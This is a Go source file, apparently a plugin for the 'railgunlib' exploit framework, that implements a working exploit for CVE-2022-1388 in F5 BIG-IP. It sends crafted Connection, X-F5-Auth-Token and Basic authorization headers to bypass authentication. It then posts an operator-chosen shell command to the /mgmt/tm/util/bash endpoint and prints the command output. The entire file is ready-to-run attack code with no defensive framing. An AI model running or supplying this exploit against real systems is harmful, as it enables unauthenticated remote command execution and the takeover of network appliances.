package exp_F5

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type Exp_CVE_2022_1388 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_1388) Attack_cmd() (expResult exp_model.ExpResult) {
	// 设置
	headers := self.GetInitExpHeaders()
	headers.Set("Connection", "Keep-alive, X-F5-Auth-Token")
	headers.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	headers.Set("X-F5-Auth-Token", "a")
	headers.Set("Content-Type", "application/json")

	cmd := strings.ReplaceAll(self.MustGetStringParam("cmd"), `"`, `\"`)
	payload := fmt.Sprintf(`{"command":"run","utilCmdArgs":"-c %s"}`, cmd)
	// 因为Connection无法设置，使用socket传输
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/mgmt/tm/util/bash"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		tmp := regexp.MustCompile(`"commandResult":"(.*?)"`).FindStringSubmatch(httpresp.Body)
		if len(tmp) > 0 {
			self.EchoSuccessMsg("漏洞存在")
			self.EchoSuccessMsg(strings.ReplaceAll(tmp[1], "\\n", "\r\n"))
		}
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2022_1388{}, "exp_CVE_2022_1388.yml")

}
